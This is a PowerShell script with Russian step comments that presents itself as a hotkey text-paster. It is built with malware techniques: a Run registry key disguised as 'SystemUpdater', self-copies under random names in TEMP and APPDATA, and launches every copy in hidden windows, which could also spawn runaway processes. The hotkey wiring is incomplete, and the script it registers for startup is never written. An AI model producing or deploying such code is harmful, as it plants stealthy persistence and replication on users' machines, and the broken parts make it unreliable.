# Шаг 1: Встраивание исходного файла через Base64
$data = [System.Text.Encoding]::UTF8.GetBytes("Строка1`nСтрока2`nСтрока3")
$encodedData = [Convert]::ToBase64String($data)

# Шаг 2: Распаковка файла при первом запуске
if (-not (Test-Path "$env:TEMP\data.txt")) {
    Set-Content -Path "$env:TEMP\data.txt" -Value ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedData)))
}

# Шаг 3: Автозагрузка через реестр (без админских прав)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemUpdater" /d "$env:TEMP\script.ps1" /f

# Шаг 4: Распределение скрипта по директориям
$dirs = @(
    "$env:TEMP",
    "$env:APPDATA"
)
foreach ($dir in $dirs) {
    if (Test-Path $dir) {
        Copy-Item -Path $MyInvocation.MyCommand.Path -Destination "$dir\backup_$([Guid]::NewGuid()).ps1" -ErrorAction SilentlyContinue
    }
}

# Шаг 5: Обработка горячих клавиш Ctrl+Alt+Q
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class KeyHook {
    [DllImport("user32.dll")]
    public static extern bool RegisterHotKey(IntPtr hWnd, int id, uint fsModifiers, uint vk);
    
    public const uint MOD_CONTROL = 0x0002;
    public const uint MOD_ALT = 0x0001;
    
    public static void Register() {
        RegisterHotKey(IntPtr.Zero, 1, MOD_CONTROL | MOD_ALT, (uint)'Q');
    }
}
"@

# Шаг 6: Логика вставки строки
function OnHotkeyPressed {
    $content = Get-Content "$env:TEMP\data.txt" -First 1
    Add-Type -AssemblyName System.Windows.Forms
    [System.Windows.Forms.SendKeys]::SendWait($content)
    Write-Host "Строка вставлена"
}

# Шаг 7: Запуск из разных точек (без админских прав)
$backupScripts = @()
foreach ($dir in $dirs) {
    if (Test-Path $dir) {
        $backupScripts += Get-ChildItem -Path $dir -Filter "backup_*.ps1" -ErrorAction SilentlyContinue
    }
}
foreach ($script in $backupScripts) {
    Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-File `"$($script.FullName)`""
}